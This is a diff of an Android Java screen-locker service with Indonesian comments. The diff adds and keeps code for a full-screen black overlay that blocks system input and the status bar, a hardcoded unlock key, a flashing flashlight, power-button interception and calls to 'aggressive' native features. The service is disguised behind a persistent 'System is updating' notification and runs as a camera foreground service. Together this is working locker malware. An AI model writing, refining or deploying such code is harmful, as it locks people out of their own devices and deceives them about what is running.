@@ -148,10 +148,10 @@ public class LockerService extends Service {
         );
     }
 
-    private String currentInput = ""; // Tambahkan di bawah deklarasi variabel class
+    private String currentInput = "";
 
     @Override
-    public void onCreate() {
+        public void onCreate() {
         super.onCreate();
     
         // 1. Memulai Foreground Service & StatusBar Blocker
@@ -164,12 +164,12 @@ public class LockerService extends Service {
         lockerLayout.setFitsSystemWindows(false);
         lockerLayout.setBackgroundColor(0xFF000000); // Hitam pekat
     
-        // 3. Konfigurasi LayoutParams (Penting untuk blokir input sistem)
+        // 3. Konfigurasi LayoutParams
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |      // Mematikan keyboard sistem secara total
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |     
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS | 
                 WindowManager.LayoutParams.FLAG_FULLSCREEN |        
@@ -179,27 +179,24 @@ public class LockerService extends Service {
     
         params.gravity = Gravity.FILL;
     
-        // Menutup area Notch/Poni pada Android P ke atas
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
         }
     
         windowManager.addView(lockerLayout, params);
     
-        // 4. Logika Native Keyboard (Glow Lines Style)
+        // 4. Logika Input Angka
         TextView display = (TextView) lockerLayout.findViewById(R.id.textDisplayPassword);
         
-        // Listener untuk input angka 0-9
         View.OnClickListener numListener = v -> {
             Button b = (Button) v;
             if (currentInput.length() < 12) {
                 currentInput += b.getText().toString();
-                display.setText(currentInput.replaceAll(".", "* ")); // Masking dengan spasi agar glow terlihat
+                display.setText(currentInput.replaceAll(".", "* ")); 
                 display.setHint(""); 
             }
         };
     
-        // Mapping tombol numerik
         int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
                            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
         for (int id : buttonIds) {
@@ -207,7 +204,6 @@ public class LockerService extends Service {
             if (btn != null) btn.setOnClickListener(numListener);
         }
     
-        // Listener Tombol Delete
         View btnDel = lockerLayout.findViewById(R.id.btnDelete);
         if (btnDel != null) {
             btnDel.setOnClickListener(v -> {
@@ -218,27 +214,27 @@ public class LockerService extends Service {
             });
         }
     
-        // Listener Tombol OK / Unlock
         View btnUnlock = lockerLayout.findViewById(R.id.btnUnlock);
         if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
+                // Memanggil verifikasi Native C++ dengan key 02042009
                 if (verifyAdvancedKey(currentInput)) {
                     isAuthenticated = true;
-                    stopSelf(); // Menghentikan service jika kunci benar
+                    stopSelf(); 
                 } else {
                     currentInput = "";
                     display.setText("");
-                    display.setHint("ACCESS DENIED"); // Feedback gagal
+                    display.setHint("ACCESS DENIED");
                 }
             });
         }
     
-        // 5. Jalankan Fitur Agresif
+        // 5. Fitur Agresif
         startNativeAggression(getPackageName() + "/.LockerService");
-        flashHandler.post(flashRunnable); // Mulai kedipan senter
+        flashHandler.post(flashRunnable);
         applyFullScreen();
     
-        // 6. Daftarkan Receiver untuk deteksi Power Button
+        // 6. Receiver Power Button
         IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
         registerReceiver(screenReceiver, filter);
     }
@@ -253,15 +249,19 @@ public class LockerService extends Service {
             if (manager != null) manager.createNotificationChannel(channel);
         }
 
-        Notification notification = null;
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("System is updating")
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .setPriority(Notification.PRIORITY_MAX)
-                    .setOngoing(true)
-                    .build();
+        Notification.Builder builder;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder = new Notification.Builder(this, CHANNEL_ID);
+        } else {
+            builder = new Notification.Builder(this);
         }
+
+        Notification notification = builder
+                .setContentTitle("System is updating")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .setOngoing(true)
+                .build();
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
         } else {
